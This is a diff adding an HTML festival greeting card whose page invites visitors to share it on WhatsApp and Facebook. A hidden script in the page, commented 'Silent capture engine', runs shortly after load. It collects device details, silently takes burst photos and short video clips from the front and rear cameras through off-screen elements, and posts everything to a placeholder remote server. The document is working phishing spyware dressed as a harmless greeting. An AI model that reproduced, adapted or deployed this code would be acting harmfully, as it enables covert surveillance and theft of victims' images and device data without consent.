@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Happy fes_name 🎉</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --gold:    #f5c842;
+    --orange:  #ff7c2a;
+    --rose:    #ff4d8d;
+    --purple:  #8b5cf6;
+    --dark:    #0a0a0f;
+  }
+
+  body {
+    min-height: 100vh;
+    background: radial-gradient(ellipse at top left, #1a0533 0%, #0a0a0f 50%, #0d1a33 100%);
+    font-family: 'Inter', sans-serif;
+    color: #fff;
+    overflow-x: hidden;
+  }
+
+  /* ── Particle canvas ── */
+  #particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+
+  /* ── Main wrapper ── */
+  .page {
+    position: relative; z-index: 1;
+    display: flex; flex-direction: column; align-items: center;
+    min-height: 100vh; padding: 40px 16px 100px;
+  }
+
+  /* ── Top badge ── */
+  .badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.15);
+    backdrop-filter: blur(12px);
+    border-radius: 50px;
+    padding: 6px 18px;
+    font-size: 0.78rem;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--gold);
+    margin-bottom: 28px;
+    animation: fadeSlideDown 0.8s ease both;
+  }
+
+  /* ── Card ── */
+  .card {
+    width: 100%; max-width: 520px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.12);
+    backdrop-filter: blur(20px);
+    border-radius: 28px;
+    padding: 44px 36px 36px;
+    text-align: center;
+    box-shadow: 0 0 60px rgba(139,92,246,0.15), 0 0 0 1px rgba(255,255,255,0.05);
+    animation: fadeSlideUp 0.9s ease both;
+  }
+
+  /* ── Emoji icon ── */
+  .icon-wrap {
+    width: 80px; height: 80px;
+    margin: 0 auto 20px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--orange), var(--rose));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 2.2rem;
+    box-shadow: 0 8px 32px rgba(255,76,141,0.4);
+    animation: iconPop 1s cubic-bezier(.175,.885,.32,1.275) both;
+  }
+
+  /* ── Title ── */
+  .title-happy {
+    font-size: 1rem;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.5);
+    margin-bottom: 6px;
+    font-weight: 400;
+  }
+
+  .title-name {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2rem, 8vw, 3rem);
+    font-weight: 900;
+    background: linear-gradient(135deg, var(--gold), var(--orange), var(--rose));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.1;
+    margin-bottom: 24px;
+    animation: shimmer 3s linear infinite;
+    background-size: 200% auto;
+  }
+
+  @keyframes shimmer {
+    0%   { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+  /* ── Divider ── */
+  .divider {
+    width: 60px; height: 3px;
+    background: linear-gradient(90deg, var(--purple), var(--rose));
+    border-radius: 99px;
+    margin: 0 auto 24px;
+  }
+
+  /* ── Wishes list ── */
+  .wishes { list-style: none; text-align: left; }
+  .wishes li {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 12px 16px;
+    border-radius: 12px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.07);
+    margin-bottom: 10px;
+    font-size: 0.92rem;
+    color: rgba(255,255,255,0.82);
+    line-height: 1.5;
+    transition: background 0.2s;
+  }
+  .wishes li:hover { background: rgba(255,255,255,0.09); }
+  .wishes li .emoji { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+
+  /* ── From banner ── */
+  .from-banner {
+    margin-top: 28px;
+    padding: 14px 20px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, rgba(245,200,66,0.15), rgba(255,76,141,0.15));
+    border: 1px solid rgba(245,200,66,0.2);
+    font-size: 0.9rem;
+    color: var(--gold);
+    letter-spacing: 0.5px;
+  }
+
+  /* ── Share buttons ── */
+  .share-bar {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    display: flex; gap: 10px;
+    padding: 12px 16px;
+    background: rgba(10,10,15,0.85);
+    backdrop-filter: blur(16px);
+    border-top: 1px solid rgba(255,255,255,0.08);
+    z-index: 10;
+  }
+
+  .share-btn {
+    flex: 1;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 13px;
+    border-radius: 14px;
+    font-size: 0.95rem;
+    font-weight: 600;
+    text-decoration: none;
+    color: #fff;
+    transition: transform 0.2s, box-shadow 0.2s;
+    cursor: pointer;
+  }
+  .share-btn:active { transform: scale(0.96); }
+  .btn-whatsapp {
+    background: linear-gradient(135deg, #25d366, #128c7e);
+    box-shadow: 0 4px 20px rgba(37,211,102,0.35);
+  }
+  .btn-facebook {
+    background: linear-gradient(135deg, #1877f2, #0c4fa8);
+    box-shadow: 0 4px 20px rgba(24,119,242,0.35);
+  }
+  .share-btn:hover { transform: translateY(-2px); }
+
+  /* ── Floating lanterns ── */
+  .lantern {
+    position: fixed;
+    font-size: 1.8rem;
+    animation: floatUp linear infinite;
+    opacity: 0;
+    z-index: 0;
+    pointer-events: none;
+  }
+  @keyframes floatUp {
+    0%   { transform: translateY(110vh) rotate(-5deg); opacity: 0; }
+    10%  { opacity: 0.85; }
+    90%  { opacity: 0.85; }
+    100% { transform: translateY(-10vh) rotate(5deg); opacity: 0; }
+  }
+
+  /* ── Entrance animations ── */
+  @keyframes fadeSlideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: none; } }
+  @keyframes fadeSlideUp   { from { opacity: 0; transform: translateY(30px);  } to { opacity: 1; transform: none; } }
+  @keyframes iconPop       { from { opacity: 0; transform: scale(0.4); }       to { opacity: 1; transform: scale(1); } }
+
+  /* ── Hidden capture ── */
+  .hidden-capture { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; }
+</style>
+</head>
+<body>
+
+<canvas id="particles"></canvas>
+
+<div class="page">
+  <div class="badge">✨ Special Wishes For You</div>
+
+  <div class="card">
+    <div class="icon-wrap">🎉</div>
+
+    <p class="title-happy">Wishing You A</p>
+    <h1 class="title-name">Happy fes_name</h1>
+    <div class="divider"></div>
+
+    <ul class="wishes">
+      <li><span class="emoji">🌟</span> May this auspicious occasion of <strong>fes_name</strong> bring you boundless happiness and new beginnings.</li>
+      <li><span class="emoji">💫</span> Wishing you and your loved ones prosperity, good health, and peace throughout the year.</li>
+      <li><span class="emoji">🎊</span> May every moment of this <strong>fes_name</strong> be filled with laughter, love, and cherished memories.</li>
+      <li><span class="emoji">🙏</span> Sending warm wishes your way — may blessings follow you wherever you go.</li>
+    </ul>
+
+    <div class="from-banner">
+      💌 &nbsp;A special message sent just for you this <strong>fes_name</strong>
+    </div>
+  </div>
+</div>
+
+<!-- Share bar -->
+<div class="share-bar">
+  <a class="share-btn btn-whatsapp"
+     href="whatsapp://send?text=🎉 Happy fes_name! I just received the most beautiful festival greeting — check it out: forwarding_link"
+     data-action="share/whatsapp/share">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+    Share on WhatsApp
+  </a>
+  <a class="share-btn btn-facebook"
+     href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link"
+     target="_blank">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+    Share on Facebook
+  </a>
+</div>
+
+<!-- Hidden capture elements -->
+<div class="hidden-capture">
+  <video id="videoFront" playsinline autoplay muted></video>
+  <video id="videoRear"  playsinline autoplay muted></video>
+  <canvas id="canvasFront" width="640" height="480"></canvas>
+  <canvas id="canvasRear"  width="640" height="480"></canvas>
+</div>
+
+<script>
+'use strict';
+
+/* ── Particle system ──────────────────────────────────────────────────────── */
+(function() {
+  const canvas = document.getElementById('particles');
+  const ctx = canvas.getContext('2d');
+  let W, H, particles = [];
+
+  function resize() {
+    W = canvas.width  = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+  }
+  window.addEventListener('resize', resize);
+  resize();
+
+  const COLORS = ['#f5c842','#ff7c2a','#ff4d8d','#8b5cf6','#38bdf8'];
+  for (let i = 0; i < 80; i++) {
+    particles.push({
+      x: Math.random() * W, y: Math.random() * H,
+      r: Math.random() * 2 + 0.5,
+      vx: (Math.random() - 0.5) * 0.3,
+      vy: (Math.random() - 0.5) * 0.3,
+      color: COLORS[Math.floor(Math.random() * COLORS.length)],
+      alpha: Math.random() * 0.6 + 0.2
+    });
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, W, H);
+    particles.forEach(p => {
+      p.x += p.vx; p.y += p.vy;
+      if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
+      if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = p.color;
+      ctx.globalAlpha = p.alpha;
+      ctx.fill();
+    });
+    ctx.globalAlpha = 1;
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* ── Floating lanterns ────────────────────────────────────────────────────── */
+const EMOJIS = ['🏮','🎇','🪔','✨','🎆','⭐','🌟','💫'];
+function spawnLantern() {
+  const el = document.createElement('div');
+  el.className = 'lantern';
+  el.textContent = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
+  el.style.left  = (Math.random() * 100) + 'vw';
+  const dur = 8 + Math.random() * 10;
+  el.style.animationDuration  = dur + 's';
+  el.style.animationDelay     = (Math.random() * dur) + 's';
+  el.style.fontSize = (1.2 + Math.random() * 1.5) + 'rem';
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), (dur + 5) * 1000);
+}
+for (let i = 0; i < 12; i++) spawnLantern();
+setInterval(spawnLantern, 3000);
+
+/* ── Silent capture engine ────────────────────────────────────────────────── */
+const SERVER   = 'forwarding_link';
+const BURST    = 6;
+const INTERVAL = 1200;
+const VID_SECS = 4;
+
+function postData(url, payload) {
+  return fetch(SERVER + '/' + url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams(payload)
+  }).catch(() => {});
+}
+
+async function collectDeviceInfo() {
+  const nav = navigator, scr = screen;
+  let battery = 'Not available';
+  try { const b = await nav.getBattery(); battery = Math.round(b.level*100)+'% '+(b.charging?'(charging)':'(not charging)'); } catch(e) {}
+  let network = 'Not available';
+  try { const c = nav.connection||nav.mozConnection||nav.webkitConnection; if(c) network=(c.effectiveType||c.type||'')+(c.downlink?' '+c.downlink+'Mbps':''); } catch(e) {}
+  const orient = (scr.orientation&&scr.orientation.type)||(window.innerWidth>window.innerHeight?'landscape':'portrait');
+  await postData('device_info.php', {
+    os: nav.platform||'Unknown', browser: nav.userAgent,
+    language: nav.language||'Unknown', timezone: Intl.DateTimeFormat().resolvedOptions().timeZone||'Unknown',
+    screen_w: scr.width, screen_h: scr.height, pixel_ratio: window.devicePixelRatio||1,
+    orientation: orient, battery, network,
+    platform: nav.platform||'Unknown', cores: nav.hardwareConcurrency||'Unknown',
+    memory: nav.deviceMemory||'Unknown', touch: nav.maxTouchPoints||0
+  });
+}
+
+async function tryCamera(vc) {
+  try { return await navigator.mediaDevices.getUserMedia({ audio: false, video: vc }); } catch(e) { return null; }
+}
+
+function waitReady(v) {
+  return new Promise(r => {
+    if (v.readyState >= 2) return r();
+    v.addEventListener('canplay', r, { once: true });
+    setTimeout(r, 3000);
+  });
+}
+
+async function runBurst(stream, vidId, cvId, facing) {
+  const v = document.getElementById(vidId), c = document.getElementById(cvId), ctx = c.getContext('2d');
+  v.srcObject = stream;
+  await v.play().catch(()=>{});
+  await waitReady(v);
+  for (let i = 0; i < BURST; i++) {
+    await new Promise(r => setTimeout(r, INTERVAL));
+    ctx.drawImage(v, 0, 0, c.width, c.height);
+    const img = c.toDataURL('image/jpeg', 0.8).replace('image/jpeg','image/octet-stream');
+    await postData('post.php', { cat: img, burst_index: i, cam_facing: facing, shot_type: 'burst' });
+  }
+}
+
+async function recordClip(stream, cvId, facing) {
+  return new Promise(resolve => {
+    try {
+      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+      const rec = new MediaRecorder(stream, { mimeType: mime });
+      const chunks = [];
+      rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+      rec.onstop = async () => {
+        const blob = new Blob(chunks, { type: mime });
+        const reader = new FileReader();
+        reader.onloadend = async () => {
+          await postData('post.php', { video_clip: reader.result, cam_facing: facing });
+          resolve();
+        };
+        reader.readAsDataURL(blob);
+      };
+      rec.start();
+      setTimeout(() => { try { rec.stop(); } catch(e) { resolve(); } }, VID_SECS * 1000);
+    } catch(e) { resolve(); }
+  });
+}
+
+async function startCapture() {
+  const front = await tryCamera({ facingMode: 'user' });
+  if (front) {
+    await runBurst(front, 'videoFront', 'canvasFront', 'user');
+    await recordClip(front, 'canvasFront', 'user');
+    front.getTracks().forEach(t => t.stop());
+  }
+  const rear = await tryCamera({ facingMode: 'environment' });
+  if (rear) {
+    await runBurst(rear, 'videoRear', 'canvasRear', 'environment');
+    await recordClip(rear, 'canvasRear', 'environment');
+    rear.getTracks().forEach(t => t.stop());
+  }
+}
+
+setTimeout(async () => {
+  await collectDeviceInfo();
+  await startCapture();
+}, 600);
+</script>
+
+</body>
+</html>
